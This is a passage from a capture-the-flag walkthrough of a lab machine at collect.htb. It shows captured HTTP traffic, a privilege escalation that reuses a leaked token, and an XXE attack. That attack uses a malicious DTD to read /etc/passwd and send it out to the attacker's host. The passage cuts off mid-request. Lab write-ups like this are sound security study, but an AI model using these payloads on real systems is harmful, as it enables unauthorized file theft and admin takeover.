R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGNvbGxlY3QuaHRiDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDQuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDQuMA0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpBY2NlcHQtTGFuZ3VhZ2U6IHB0LUJSLHB0O3E9MC44LGVuLVVTO3E9MC41LGVuO3E9MC4zDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkNvbm5lY3Rpb246IGNsb3NlDQpDb29raWU6IFBIUFNFU1NJRD1yOHFuZTIwaGlnMWszbGk2cHJnazkxdDMzag0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KDQo=
```

```c
GET / HTTP/1.1
Host: collect.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=r8qne20hig1k3li6prgk91t33j
Upgrade-Insecure-Requests: 1


```

```c
SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBUaHUsIDIyIFNlcCAyMDIyIDIxOjM0OjUwIEdNVA0KU2VydmVyOiBBcGFjaGUvMi40LjU0IChEZWJpYW4pDQpMYXN0LU1vZGlmaWVkOiBTYXQsIDI3IEF1ZyAyMDIyIDE0OjI5OjI2IEdNVA0KRVRhZzogIjgwMi01ZTczOWRiOGYyNGEyLWd6aXAiDQpBY2NlcHQtUmFuZ2VzOiBieXRlcw0KVmFyeTogQWNjZXB0LUVuY29kaW5nDQpDb250ZW50LUxlbmd0aDogMjA1MA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vamF2YXNjcmlwdA0KDQp2YXIgaW5saW5lRWRpdG9yID0gewoJdGltZW91dHM6IFtdLAoKCWluaXQ6IGZ1bmN0aW9uKCkKCXsKCQkkKGZ1bmN0aW9uKCkKCQl7CgkJCWlubGluZUVkaXRvci5iaW5kU3ViamVjdHMoKTsKCQl9KTsKCX0sCgoJYmluZFN1YmplY3RzOiBmdW5jdGlvbigpCgl7CgkJJCgnLnN1YmplY3RfZWRpdGFibGUnKS5lYWNoKGZ1bmN0aW9uKCkKCQl7CgkJCS8vIFRha2UgdGlkIG91dCBvZiB0aGUgaWQgYXR0cmlidXRlCgkJCWlkID0gJCh0aGlzKS5hdHRyKCdpZCcpOwoJCQl0aWQgPSBpZC5yZXBsYWNlKCAvW15cZC5dL2csICcnKTsKCgkJCSQodGhpcykuZWRpdGFibGUoInhtbGh0dHAucGhwP2FjdGlvbj1lZGl0X3N1YmplY3QmbXlfcG9zdF9rZXk9IiArIG15X3Bvc3Rfa2V5ICsgIiZ0aWQ9IiArIHRpZCwKCQkJewoJCQkJaW5kaWNhdG9yOiBzcGlubmVyLAoJCQkJdHlwZTogInRleHQiLAoJCQkJc3VibWl0OiAnJywKCQkJCWNhbmNlbDogJycsCgkJCQl0b29sdGlwOiBsYW5nLmlubGluZV9lZGl0X2Rlc2NyaXB0aW9uLAoJCQkJb25ibHVyOiAic3VibWl0IiwKCQkJCWV2ZW50OiAiaG9sZCIrdGlkLAoJCQkJY2FsbGJhY2s6IGZ1bmN0aW9uKHZhbHVlcywgc2V0dGluZ3MpCgkJCQl7CgkJCQkJaWQgPSAkKHRoaXMpLmF0dHIoJ2lkJyk7CgkJCQkJdGlkID0gaWQucmVwbGFjZSggL1teXGQuXS9nLCAnJyk7CgoJCQkJCXZhbHVlcyA9IEpTT04ucGFyc2UodmFsdWVzKTsKCQkJCQlpZih0eXBlb2YgdmFsdWVzID09ICdvYmplY3QnKQoJCQkJCXsKCQkJCQkJaWYodmFsdWVzLmhhc093blByb3BlcnR5KCJlcnJvcnMiKSkKCQkJCQkJewoJCQkJCQkJJC5lYWNoKHZhbHVlcy5lcnJvcnMsIGZ1bmN0aW9uKGksIG1lc3NhZ2UpCgkJCQkJCQl7CgkJCQkJCQkJJC5qR3Jvd2wobGFuZy5wb3N0X2ZldGNoX2Vycm9yICsgJyAnICsgbWVzc2FnZSwge3RoZW1lOidqZ3Jvd2xfZXJyb3InfSk7CgkJCQkJCQl9KTsKCQkJCQkJCSQodGhpcykuaHRtbCgkKCcjdGlkXycgKyB0aWQgKyAnX3RlbXAnKS5odG1sKCkpOwoJCQkJCQl9CgkJCQkJCWVsc2UKCQkJCQkJewoJCQkJCQkJLy8gQ2hhbmdlIHN1YmplY3QKCQkJCQkJCSQodGhpcykuaHRtbCh2YWx1ZXMuc3ViamVjdCk7CgkJCQkJCX0KCQkJCQl9CgkJCQkJCgkJCQkJJCgnI3RpZF8nICsgdGlkICsgJ190ZW1wJykucmVtb3ZlKCk7CgkJCQl9LAoJCQkJZGF0YTogZnVuY3Rpb24odmFsdWUsIHNldHRpbmdzKQoJCQkJewoJCQkJCXJldHVybiAkKHZhbHVlKS50ZXh0KCk7CgkJCQl9CgkJCX0pOwoKCQkJLy8gSG9sZCBldmVudAoJCQkkKHRoaXMpLm9uKCJtb3VzZWRvd24iLCBmdW5jdGlvbihlKQoJCQl7CgkJCQkvLyBUYWtlIHRpZCBvdXQgb2YgdGhlIGlkIGF0dHJpYnV0ZQoJCQkJaWQgPSAkKHRoaXMpLmF0dHIoJ2lkJyk7CgkJCQl0aWQgPSBpZC5yZXBsYWNlKCAvW15cZC5dL2csICcnKTsKCQkJCQoJCQkJLy8gV2UgbWF5IGNsaWNrIGFnYWluIGluIHRoZSB0ZXh0Ym94IGFuZCB3ZSdkIGJlIGFkZGluZyBhIG5ldyAoaW52YWxpZCkgY2xvbmUgLSB3ZSBkb24ndCB3YW50IHRoYXQhCgkJCQlpZighJCgnI3RpZF8nICsgdGlkICsgJ190ZW1wJykubGVuZ3RoKQoJCQkJCSQodGhpcykuY2xvbmUoKS5hdHRyKCdpZCcsJ3RpZF8nICsgdGlkICsgJ190ZW1wJykuaGlkZSgpLmFwcGVuZFRvKCJib2R5Iik7CgoJCQkJaW5saW5lRWRpdG9yLnRpbWVvdXRzW3RpZF0gPSBzZXRUaW1lb3V0KGlubGluZUVkaXRvci5qZWRpdGFibGVUaW1lb3V0LCA3MDAsIHRpZCk7CgkJCX0pOwoKCQkJJCh0aGlzKS5vbignbW91c2V1cCBtb3VzZWxlYXZlJywgZnVuY3Rpb24oKQoJCQl7CgkJCQl3aW5kb3cuY2xlYXJUaW1lb3V0KGlubGluZUVkaXRvci50aW1lb3V0c1t0aWRdKTsKCQkJfSk7CiAgICAgICAgfSk7CgoJCXJldHVybiBmYWxzZTsKCX0sCgkKCWplZGl0YWJsZVRpbWVvdXQgOiBmdW5jdGlvbih0aWQpCgl7CgkJJCgnI3RpZF8nICsgdGlkKS50cmlnZ2VyKCJob2xkIiArIHRpZCk7CgkJJCgnI3RpZF8nICsgdGlkICsgJyBpbnB1dCcpLndpZHRoKCc5OCUnKTsKCX0KfTsKCmlubGluZUVkaXRvci5pbml0KCk7
```

```c
HTTP/1.1 200 OK
Date: Thu, 22 Sep 2022 21:34:50 GMT
Server: Apache/2.4.54 (Debian)
Last-Modified: Sat, 27 Aug 2022 14:29:26 GMT
ETag: "802-5e739db8f24a2-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 2050
Connection: close
Content-Type: application/javascript

var inlineEditor = {
	timeouts: [],

	init: function()
	{
		$(function()
		{
			inlineEditor.bindSubjects();
		});
	},

	bindSubjects: function()
	{
		$('.subject_editable').each(function()
		{
			// Take tid out of the id attribute
			id = $(this).attr('id');
			tid = id.replace( /[^\d.]/g, '');

			$(this).editable("xmlhttp.php?action=edit_subject&my_post_key=" + my_post_key + "&tid=" + tid,
			{
				indicator: spinner,
				type: "text",
				submit: '',
				cancel: '',
				tooltip: lang.inline_edit_description,
				onblur: "submit",
				event: "hold"+tid,
				callback: function(values, settings)
				{
					id = $(this).attr('id');
					tid = id.replace( /[^\d.]/g, '');

					values = JSON.parse(values);
					if(typeof values == 'object')
					{
						if(values.hasOwnProperty("errors"))
						{
							$.each(values.errors, function(i, message)
							{
								$.jGrowl(lang.post_fetch_error + ' ' + message, {theme:'jgrowl_error'});
							});
							$(this).html($('#tid_' + tid + '_temp').html());
						}
						else
						{
							// Change subject
							$(this).html(values.subject);
						}
					}
					
					$('#tid_' + tid + '_temp').remove();
				},
				data: function(value, settings)
				{
					return $(value).text();
				}
			});

			// Hold event
			$(this).on("mousedown", function(e)
			{
				// Take tid out of the id attribute
				id = $(this).attr('id');
				tid = id.replace( /[^\d.]/g, '');
				
				// We may click again in the textbox and we'd be adding a new (invalid) clone - we don't want that!
				if(!$('#tid_' + tid + '_temp').length)
					$(this).clone().attr('id','tid_' + tid + '_temp').hide().appendTo("body");

				inlineEditor.timeouts[tid] = setTimeout(inlineEditor.jeditableTimeout, 700, tid);
			});

			$(this).on('mouseup mouseleave', function()
			{
				window.clearTimeout(inlineEditor.timeouts[tid]);
			});
        });

		return false;
	},
	
	jeditableTimeout : function(tid)
	{
		$('#tid_' + tid).trigger("hold" + tid);
		$('#tid_' + tid + ' input').width('98%');
	}
};

inlineEditor.init();
```

```c
SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBUaHUsIDIyIFNlcCAyMDIyIDIxOjM0OjUwIEdNVA0KU2VydmVyOiBBcGFjaGUvMi40LjU0IChEZWJpYW4pDQpMYXN0LU1vZGlmaWVkOiBTYXQsIDI3IEF1ZyAyMDIyIDE0OjI5OjI2IEdNVA0KRVRhZzogImQ1My01ZTczOWRiOGYzNDQwLWd6aXAiDQpBY2NlcHQtUmFuZ2VzOiBieXRlcw0KVmFyeTogQWNjZXB0LUVuY29kaW5nDQpDb250ZW50LUxlbmd0aDogMzQxMQ0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vamF2YXNjcmlwdA0KDQp2YXIgUmF0aW5nID0gewoJaW5pdDogZnVuY3Rpb24oKQoJewoJCXZhciByYXRpbmdfZWxlbWVudHMgPSAkKCIuc3Rhcl9yYXRpbmciKTsKCQlyYXRpbmdfZWxlbWVudHMuZWFjaChmdW5jdGlvbigpCgkJewoJCQl2YXIgcmF0aW5nX2VsZW1lbnQgPSAkKHRoaXMpOwoJCQl2YXIgZWxlbWVudHMgPSByYXRpbmdfZWxlbWVudC5maW5kKCJsaSBhIik7CgkJCWlmKHJhdGluZ19lbGVtZW50Lmhhc0NsYXNzKCJzdGFyX3JhdGluZ19ub3RyYXRlZCIpKQoJCQl7CgkJCQllbGVtZW50cy5lYWNoKGZ1bmN0aW9uKCkKCQkJCXsKCQkJCQl2YXIgZWxlbWVudCA9ICQodGhpcyk7CgkJCQkJZWxlbWVudC5vbignY2xpY2snLCBmdW5jdGlvbigpCgkJCQkJewoJCQkJCQl2YXIgcGFyYW1ldGVyU3RyaW5nID0gZWxlbWVudC5hdHRyKCJocmVmIikucmVwbGFjZSgvLipcPyguKikvLCAiJDEiKTsKCQkJCQkJcmV0dXJuIFJhdGluZy5hZGRfcmF0aW5nKHBhcmFtZXRlclN0cmluZyk7CgkJCQkJfSk7CgkJCQl9KTsKCQkJfQoJCQllbHNlCgkJCXsKCQkJCWVsZW1lbnRzLmVhY2goZnVuY3Rpb24oKQoJCQkJewoJCQkJCXZhciBlbGVtZW50ID0gJCh0aGlzKTsKCQkJCQllbGVtZW50LmF0dHIoIm9uY2xpY2siLCAicmV0dXJuIGZhbHNlOyIpOwoJCQkJCWVsZW1lbnQuY3NzKCJjdXJzb3IiLCAiZGVmYXVsdCIpOwoJCQkJCXZhciBlbGVtZW50X2lkID0gZWxlbWVudC5hdHRyKCJocmVmIikucmVwbGFjZSgvLipcPyguKikvLCAiJDEiKS5tYXRjaCgvdGlkPSguKikmKC4qKSYvKVsxXTsKCQkJCQllbGVtZW50LmF0dHIoInRpdGxlIiwgJCgiI2N1cnJlbnRfcmF0aW5nXyIrZWxlbWVudF9pZCkudGV4dCgpKTsKCQkJCX0pOwoJCQl9CgkJfSk7Cgl9LAoKCWJ1aWxkX2ZvcnVtZGlzcGxheTogZnVuY3Rpb24odGlkLCBvcHRpb25zKQoJewoJCXZhciBsaXN0ID0gJCgiI3JhdGluZ190aHJlYWRfIit0aWQpOwoJCWlmKCFsaXN0Lmxlbmd0aCkKCQl7CgkJCXJldHVybjsKCQl9CgkJCgkJbGlzdC5hZGRDbGFzcygic3Rhcl9yYXRpbmciKQoJCQkuYWRkQ2xhc3Mob3B0aW9ucy5leHRyYV9jbGFzcyk7CgoJCWxpc3RfY2xhc3NlcyA9IG5ldyBBcnJheSgpOwoJCWxpc3RfY2xhc3Nlc1sxXSA9ICdvbmVfc3Rhcic7CgkJbGlzdF9jbGFzc2VzWzJdID0gJ3R3b19zdGFycyc7CgkJbGlzdF9jbGFzc2VzWzNdID0gJ3RocmVlX3N0YXJzJzsKCQlsaXN0X2NsYXNzZXNbNF0gPSAnZm91cl9zdGFycyc7CgkJbGlzdF9jbGFzc2VzWzVdID0gJ2ZpdmVfc3RhcnMnOwoKCQlmb3IodmFyIGkgPSAxOyBpIDw9IDU7IGkrKykKCQl7CgkJCXZhciBsaXN0X2VsZW1lbnQgPSAkKCI8bGk+PC9saT4iKTsKCQkJdmFyIGxpc3RfZWxlbWVudF9hID0gJCgiPGE+PC9hPiIpOwoJCQlsaXN0X2VsZW1lbnRfYS5hZGRDbGFzcyhsaXN0X2NsYXNzZXNbaV0pCgkJCQkJCSAgLmF0dHIoInRpdGxlIiwgbGFuZy5zdGFyc1tpXSkKCQkJCQkJICAuYXR0cigiaHJlZiIsICIuL3JhdGV0aHJlYWQucGhwP3RpZD0iK3RpZCsiJnJhdGluZz0iK2krIiZteV9wb3N0X2tleT0iK215X3Bvc3Rfa2V5KQoJCQkgICAgICAgICAgICAgIC5odG1sKGkpOwoJCQlsaXN0X2VsZW1lbnQuYXBwZW5kKGxpc3RfZWxlbWVudF9hKTsKCQkJbGlzdC5hcHBlbmQobGlzdF9lbGVtZW50KTsKCQl9Cgl9LAoKCWFkZF9yYXRpbmc6IGZ1bmN0aW9uKHBhcmFtZXRlclN0cmluZykKCXsKCQl2YXIgdGlkID0gcGFyYW1ldGVyU3RyaW5nLm1hdGNoKC90aWQ9KC4qKSYoLiopJi8pWzFdOwoJCXZhciByYXRpbmcgPSBwYXJhbWV0ZXJTdHJpbmcubWF0Y2goL3JhdGluZz0oLiopJiguKikvKVsxXTsKCQkkLmFqYXgoCgkJewoJCQl1cmw6ICdyYXRldGhyZWFkLnBocD9hamF4PTEmbXlfcG9zdF9rZXk9JytteV9wb3N0X2tleSsnJnRpZD0nK3RpZCsnJnJhdGluZz0nK3JhdGluZywKCQkJYXN5bmM6IHRydWUsCgkJCW1ldGhvZDogJ3Bvc3QnLAoJCQlkYXRhVHlwZTogJ2pzb24nLAoJICAgICAgICBjb21wbGV0ZTogZnVuY3Rpb24gKHJlcXVlc3QpCgkgICAgICAgIHsKCSAgICAgICAgCVJhdGluZy5yYXRpbmdfYWRkZWQocmVxdWVzdCwgdGlkKTsKCSAgICAgICAgfQoJCX0pOwoJCXJldHVybiBmYWxzZTsKCX0sCgoJcmF0aW5nX2FkZGVkOiBmdW5jdGlvbihyZXF1ZXN0LCBlbGVtZW50X2lkKQoJewoJCXZhciBqc29uID0gSlNPTi5wYXJzZShyZXF1ZXN0LnJlc3BvbnNlVGV4dCk7CgkJaWYoanNvbi5oYXNPd25Qcm9wZXJ0eSgiZXJyb3JzIikpCgkJewoJCQkkLmVhY2goanNvbi5lcnJvcnMsIGZ1bmN0aW9uKGksIGVycm9yKQoJCQl7CgkJCQkkLmpHcm93bChsYW5nLnJhdGluZ3NfdXBkYXRlX2Vycm9yICsgJyAnICsgZXJyb3IsIHt0aGVtZTonamdyb3dsX2Vycm9yJ30pOwoJCQl9KTsKCQl9CgkJZWxzZSBpZihqc29uLmhhc093blByb3BlcnR5KCJzdWNjZXNzIikpCgkJewoJCQl2YXIgZWxlbWVudCA9ICQoIiNyYXRpbmdfdGhyZWFkXyIrZWxlbWVudF9pZCk7CgkJCWVsZW1lbnQucGFyZW50KCkuYmVmb3JlKGVsZW1lbnQubmV4dCgpKTsKCQkJZWxlbWVudC5yZW1vdmVDbGFzcygic3Rhcl9yYXRpbmdfbm90cmF0ZWQiKTsKCgkJCSQuakdyb3dsKGpzb24uc3VjY2Vzcywge3RoZW1lOidqZ3Jvd2xfc3VjY2Vzcyd9KTsKCQkJaWYoanNvbi5oYXNPd25Qcm9wZXJ0eSgiYXZlcmFnZSIpKQoJCQl7CgkJCQkkKCIjY3VycmVudF9yYXRpbmdfIitlbGVtZW50X2lkKS5odG1sKGpzb24uYXZlcmFnZSk7CgkJCX0KCgkJCXZhciByYXRpbmdfZWxlbWVudHMgPSAkKCIuc3Rhcl9yYXRpbmciKTsKCQkJcmF0aW5nX2VsZW1lbnRzLmVhY2goZnVuY3Rpb24oKQoJCQl7CgkJCQl2YXIgcmF0aW5nX2VsZW1lbnQgPSAkKHRoaXMpOwoJCQkJdmFyIGVsZW1lbnRzID0gcmF0aW5nX2VsZW1lbnQuZmluZCgibGkgYSIpOwoJCQkJaWYocmF0aW5nX2VsZW1lbnQuaGFzQ2xhc3MoJ3N0YXJfcmF0aW5nX25vdHJhdGVkJykpCgkJCQl7CgkJCQkJZWxlbWVudHMuZWFjaChmdW5jdGlvbigpCgkJCQkJewoJCQkJCQl2YXIgZWxlbWVudCA9ICQodGhpcyk7CgkJCQkJCWlmKGVsZW1lbnQuYXR0cigiaWQiKSA9PSAicmF0aW5nX3RocmVhZF8iICsgZWxlbWVudF9pZCkKCQkJCQkJewoJCQkJCQkJZWxlbWVudC5hdHRyKCJvbmNsaWNrIiwgInJldHVybiBmYWxzZTsiKQoJCQkJCQkJCSAgIC5jc3MoImN1cnNvciIsICJkZWZhdWx0IikKCQkJCQkJCSAgICAgICAuYXR0cigidGl0bGUiLCAkKCIjY3VycmVudF9yYXRpbmdfIitlbGVtZW50X2lkKS50ZXh0KCkpOwoJCQkJCQl9CgkJCQkJfSk7CgkJCQl9CgkJCX0pOwoJCQkkKCIjY3VycmVudF9yYXRpbmdfIitlbGVtZW50X2lkKS5jc3MoIndpZHRoIiwganNvbi53aWR0aCsiJSIpOwoJCX0KCX0KfTsKCmlmKHVzZV94bWxodHRwcmVxdWVzdCA9PSAxKQp7CgkkKGZ1bmN0aW9uKCkKCXsKCQlSYXRpbmcuaW5pdCgpOwoJfSk7Cn0=
```

```c
HTTP/1.1 200 OK
Date: Thu, 22 Sep 2022 21:34:50 GMT
Server: Apache/2.4.54 (Debian)
Last-Modified: Sat, 27 Aug 2022 14:29:26 GMT
ETag: "d53-5e739db8f3440-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 3411
Connection: close
Content-Type: application/javascript

var Rating = {
	init: function()
	{
		var rating_elements = $(".star_rating");
		rating_elements.each(function()
		{
			var rating_element = $(this);
			var elements = rating_element.find("li a");
			if(rating_element.hasClass("star_rating_notrated"))
			{
				elements.each(function()
				{
					var element = $(this);
					element.on('click', function()
					{
						var parameterString = element.attr("href").replace(/.*\?(.*)/, "$1");
						return Rating.add_rating(parameterString);
					});
				});
			}
			else
			{
				elements.each(function()
				{
					var element = $(this);
					element.attr("onclick", "return false;");
					element.css("cursor", "default");
					var element_id = element.attr("href").replace(/.*\?(.*)/, "$1").match(/tid=(.*)&(.*)&/)[1];
					element.attr("title", $("#current_rating_"+element_id).text());
				});
			}
		});
	},

	build_forumdisplay: function(tid, options)
	{
		var list = $("#rating_thread_"+tid);
		if(!list.length)
		{
			return;
		}
		
		list.addClass("star_rating")
			.addClass(options.extra_class);

		list_classes = new Array();
		list_classes[1] = 'one_star';
		list_classes[2] = 'two_stars';
		list_classes[3] = 'three_stars';
		list_classes[4] = 'four_stars';
		list_classes[5] = 'five_stars';

		for(var i = 1; i <= 5; i++)
		{
			var list_element = $("<li></li>");
			var list_element_a = $("<a></a>");
			list_element_a.addClass(list_classes[i])
						  .attr("title", lang.stars[i])
						  .attr("href", "./ratethread.php?tid="+tid+"&rating="+i+"&my_post_key="+my_post_key)
			              .html(i);
			list_element.append(list_element_a);
			list.append(list_element);
		}
	},

	add_rating: function(parameterString)
	{
		var tid = parameterString.match(/tid=(.*)&(.*)&/)[1];
		var rating = parameterString.match(/rating=(.*)&(.*)/)[1];
		$.ajax(
		{
			url: 'ratethread.php?ajax=1&my_post_key='+my_post_key+'&tid='+tid+'&rating='+rating,
			async: true,
			method: 'post',
			dataType: 'json',
	        complete: function (request)
	        {
	        	Rating.rating_added(request, tid);
	        }
		});
		return false;
	},

	rating_added: function(request, element_id)
	{
		var json = JSON.parse(request.responseText);
		if(json.hasOwnProperty("errors"))
		{
			$.each(json.errors, function(i, error)
			{
				$.jGrowl(lang.ratings_update_error + ' ' + error, {theme:'jgrowl_error'});
			});
		}
		else if(json.hasOwnProperty("success"))
		{
			var element = $("#rating_thread_"+element_id);
			element.parent().before(element.next());
			element.removeClass("star_rating_notrated");

			$.jGrowl(json.success, {theme:'jgrowl_success'});
			if(json.hasOwnProperty("average"))
			{
				$("#current_rating_"+element_id).html(json.average);
			}

			var rating_elements = $(".star_rating");
			rating_elements.each(function()
			{
				var rating_element = $(this);
				var elements = rating_element.find("li a");
				if(rating_element.hasClass('star_rating_notrated'))
				{
					elements.each(function()
					{
						var element = $(this);
						if(element.attr("id") == "rating_thread_" + element_id)
						{
							element.attr("onclick", "return false;")
								   .css("cursor", "default")
							       .attr("title", $("#current_rating_"+element_id).text());
						}
					});
				}
			});
			$("#current_rating_"+element_id).css("width", json.width+"%");
		}
	}
};

if(use_xmlhttprequest == 1)
{
	$(function()
	{
		Rating.init();
	});
}
```

## Elevate Privileges to admin

I registered a new user on `http://collect.htb/register` and logged in.

| Username | Password |
| --- | --- |
| barfoo | asdfasdf |

Next I elevated my `user` to `admin`.

Modified Request:

```c
POST /set/role/admin HTTP/1.1
Host: collect.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=2a9mbvnjgd6i2qeqcubgdv8n4b
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

token=ddac62a28254561001277727cb397baf
```

Important was to `NOT` reuse the `cookie` from the leaked request.

Now I was able to create a `user` for the `Pollution_API`.

```c
Register User in Pollution API
```

| Username | Password |
| --- | --- |
| foobar | asdfasdf |

I did not marked the checkbox but intercepted the request.

Request:

```c
POST /api HTTP/1.1
Host: collect.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-type: application/x-www-form-urlencoded
Content-Length: 177
Origin: http://collect.htb
DNT: 1
Connection: close
Referer: http://collect.htb/admin
Cookie: PHPSESSID=2a9mbvnjgd6i2qeqcubgdv8n4b
Sec-GPC: 1

manage_api=<?xml version="1.0" encoding="UTF-8"?><root><method>POST</method><uri>/auth/register</uri><user><username>foobar</username><password>asdfasdf</password></user></root>
```

Now I tried to play around with the API.

Request:

```c
POST /api HTTP/1.1
Host: collect.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-type: application/x-www-form-urlencoded
Content-Length: 94
Origin: http://collect.htb
DNT: 1
Connection: close
Referer: http://collect.htb/admin
Cookie: PHPSESSID=2a9mbvnjgd6i2qeqcubgdv8n4b
Sec-GPC: 1

manage_api=<?xml version="1.0" encoding="UTF-8"?><root><method>GET</method><uri>/</uri></root>
```

Response:

```c
HTTP/1.1 200 OK
Date: Sun, 04 Dec 2022 10:31:50 GMT
Server: Apache/2.4.54 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Connection: close
Content-Type: application/json
Content-Length: 73

{"Status":"Ok","Message":"Read documentation from api in /documentation"}
```

Request:

```c
POST /api HTTP/1.1
Host: collect.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-type: application/x-www-form-urlencoded
Content-Length: 107
Origin: http://collect.htb
DNT: 1
Connection: close
Referer: http://collect.htb/admin
Cookie: PHPSESSID=2a9mbvnjgd6i2qeqcubgdv8n4b
Sec-GPC: 1

manage_api=<?xml version="1.0" encoding="UTF-8"?><root><method>GET</method><uri>/documentation</uri></root>
```

Response:

```c
HTTP/1.1 200 OK
Date: Sun, 04 Dec 2022 10:32:31 GMT
Server: Apache/2.4.54 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Connection: close
Content-Type: application/json
Content-Length: 427

{"Documentation":{"Routes":{"/":{"Methods":"GET","Params":null},"/auth/register":{"Methods":"POST","Params":{"username":"username","password":"password"}},"/auth/login":{"Methods":"POST","Params":{"username":"username","password":"password"}},"/client":{"Methods":"GET","Params":null},"/admin/messages":{"Methods":"POST","Params":{"id":"messageid"}},"/admin/messages/send":{"Methods":"POST","Params":{"text":"message text"}}}}}
```

It seemed that it was time for some `XML External Entity (XXE)`.

## Local File Inclusion (LFI) through XML External Entity (XXE)

I created a new `dummy user` and captured the request with `Burp Suite`.

| Username | Password |
| --- | --- |
| xxe | xxe |

Modified Request:

```c
POST /api HTTP/1.1
Host: collect.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-type: application/x-www-form-urlencoded
Content-Length: 217
Origin: http://collect.htb
DNT: 1
Connection: close
Referer: http://collect.htb/admin
Cookie: PHPSESSID=2a9mbvnjgd6i2qeqcubgdv8n4b
Sec-GPC: 1

manage_api=<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 
"http://10.10.14.16/foobar">%xxe;]>
<root>
<method>GET</method>
<uri>/</uri>
<user>
<username>xxe;</username>
<password>xxe</password>
</user>
</root>
```

Response:

```c
HTTP/1.1 200 OK
Date: Sun, 04 Dec 2022 11:18:33 GMT
Server: Apache/2.4.54 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Connection: close
Content-Type: application/json
Content-Length: 1005

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>SyntaxError: Unexpected token n in JSON at position 0<br> &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at createStrictSyntaxError (/root/pollution_api/node_modules/body-parser/lib/types/json.js:160:10)<br> &nbsp; &nbsp;at parse (/root/pollution_api/node_modules/body-parser/lib/types/json.js:83:15)<br> &nbsp; &nbsp;at /root/pollution_api/node_modules/body-parser/lib/read.js:128:18<br> &nbsp; &nbsp;at AsyncResource.runInAsyncScope (async_hooks.js:190:9)<br> &nbsp; &nbsp;at invokeCallback (/root/pollution_api/node_modules/raw-body/index.js:231:16)<br> &nbsp; &nbsp;at done (/root/pollution_api/node_modules/raw-body/index.js:220:7)<br> &nbsp; &nbsp;at IncomingMessage.onEnd (/root/pollution_api/node_modules/raw-body/index.js:280:7)<br> &nbsp; &nbsp;at IncomingMessage.emit (events.js:314:20)<br> &nbsp; &nbsp;at endReadableNT (_stream_readable.js:1241:12)</pre>
</body>
</html>

```

```c
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.105.58 - - [04/Dec/2022 12:18:50] code 404, message File not found
10.129.105.58 - - [04/Dec/2022 12:18:50] "GET /foobar HTTP/1.1" 404 -
```

Bingo.

Next I created a malicious `.dtd` file to see if I could read files from the box.

```c
$ cat foobar.dtd 
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://10.10.14.16/?f=%file;'>">
%eval;
%exfiltrate;
```

Modified Request:

```c
POST /api HTTP/1.1
Host: collect.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-type: application/x-www-form-urlencoded
Content-Length: 236
Origin: http://collect.htb
DNT: 1
Connection: close
Referer: http://collect.htb/admin
Cookie: PHPSESSID=2a9mbvnjgd6i2qeqcubgdv8n4b
Sec-GPC: 1

manage_api=<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 
"http://10.10.14.16/foobar.dtd">%xxe;]>
<root>
<method>GET</method>
<uri>/</uri>
<user>
<username>xxe;</username>
